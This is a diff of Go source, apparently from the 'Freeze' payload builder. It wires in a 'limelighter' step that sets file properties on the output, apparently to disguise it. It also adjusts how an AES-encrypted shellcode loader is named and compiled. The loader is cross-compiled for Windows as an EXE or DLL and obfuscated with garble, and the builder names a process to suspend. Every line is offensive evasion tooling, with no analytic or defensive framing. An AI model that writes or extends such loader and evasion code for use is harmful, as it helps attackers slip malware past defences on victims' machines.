@@ -3,6 +3,7 @@ package main
 import (
 	"Freeze/Loader"
 	"Freeze/Utils"
+	"Freeze/limelighter"
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
@@ -48,6 +49,9 @@ func execute(opt *FlagOptions, name string, mode string) {
 	bin, _ := exec.LookPath("env")
 	var compiledname string
 	var cmd *exec.Cmd
+	name = limelighter.FileProperties(name, "")
+	fmt.Println("[!] name: " + name)
+
 	if mode == "dll" {
 		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "../.lib/garble", "-seed=random", "-literals", "build", "-o", ""+name+"", "-buildmode=c-shared")
 	} else {
@@ -132,13 +136,18 @@ func main() {
 	if strings.HasSuffix(opt.outFile, "dll") == true {
 		mode = "dll"
 	} else {
-		mode = ".exe"
+		mode = "exe"
 	}
 	if opt.export != "" {
 		fmt.Println("[!] Added an additional Export function called: " + opt.export)
 	}
 	fmt.Println("[!] Selected Process to Suspend: " + opt.process)
-	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, opt.outFile, opt.console, mode, opt.export, opt.sandbox, opt.process, opt.encrypt)
+
+	var filename string
+	_, filename = Loader.FileName(mode)
+
+	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, filename, opt.console, mode, opt.export, opt.sandbox, opt.process, opt.encrypt)
+	fmt.Println("[!] name: " + name)
 	execute(opt, name, mode)
 
 }
